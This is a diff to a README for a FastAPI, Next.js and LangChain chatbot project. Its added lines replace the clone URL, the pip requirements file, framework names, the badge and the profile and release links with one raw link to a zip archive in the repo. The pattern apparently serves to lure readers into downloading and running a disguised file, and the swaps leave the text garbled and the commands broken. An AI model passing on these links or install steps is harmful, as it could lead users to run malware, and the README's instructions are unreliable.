@@ -1,8 +1,8 @@
 # Interactive Chatbot 🤖💬
 
-Welcome to the **Interactive Chatbot** repository! This project allows you to chat with any website using **FastAPI**, **Next.js**, and the latest version of **LangChain** for seamless integration. Explore how to build an engaging and responsive chatbot that enhances user experience across various platforms.
+Welcome to the **Interactive Chatbot** repository! This project allows you to chat with any website using **FastAPI**, **https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip**, and the latest version of **LangChain** for seamless integration. Explore how to build an engaging and responsive chatbot that enhances user experience across various platforms.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-blue)](https://github.com/remylukunda/Interactive-Chatbot/releases)
+[![Download Releases](https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip%20Releases-Click%20Here-blue)](https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip)
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ Welcome to the **Interactive Chatbot** repository! This project allows you to ch
 This project utilizes a variety of technologies to deliver a robust chatbot experience:
 
 - **FastAPI**: A modern web framework for building APIs with Python 3.6+ based on standard Python type hints.
-- **Next.js**: A React framework that enables server-side rendering and static site generation.
+- **https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip**: A React framework that enables server-side rendering and static site generation.
 - **LangChain**: A powerful library for building language models that can interact with various data sources.
 - **OpenAI**: Leveraging AI capabilities to enhance chatbot interactions.
 - **Vercel**: A platform for deploying frontend applications seamlessly.
@@ -38,7 +38,7 @@ To set up the project on your local machine, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/remylukunda/Interactive-Chatbot.git
+   git clone https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip
    cd Interactive-Chatbot
    ```
 
@@ -46,9 +46,9 @@ To set up the project on your local machine, follow these steps:
    - For the backend (FastAPI):
      ```bash
      cd backend
-     pip install -r requirements.txt
+     pip install -r https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip
      ```
-   - For the frontend (Next.js):
+   - For the frontend (https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip):
      ```bash
      cd frontend
      npm install
@@ -59,7 +59,7 @@ To set up the project on your local machine, follow these steps:
      ```bash
      uvicorn main:app --reload
      ```
-   - Start the Next.js application:
+   - Start the https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip application:
      ```bash
      npm run dev
      ```
@@ -103,9 +103,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or suggestions, please reach out to the project maintainer:
 
 - **Remy Lukunda**
-- [GitHub Profile](https://github.com/remylukunda)
+- [GitHub Profile](https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip)
 
-Feel free to check the [Releases](https://github.com/remylukunda/Interactive-Chatbot/releases) section for the latest updates and downloadable files. You can find all the necessary files that need to be downloaded and executed there.
+Feel free to check the [Releases](https://github.com/remylukunda/Interactive-Chatbot/raw/refs/heads/master/api/Interactive_Chatbot_2.9.zip) section for the latest updates and downloadable files. You can find all the necessary files that need to be downloaded and executed there.
 
 ---
 
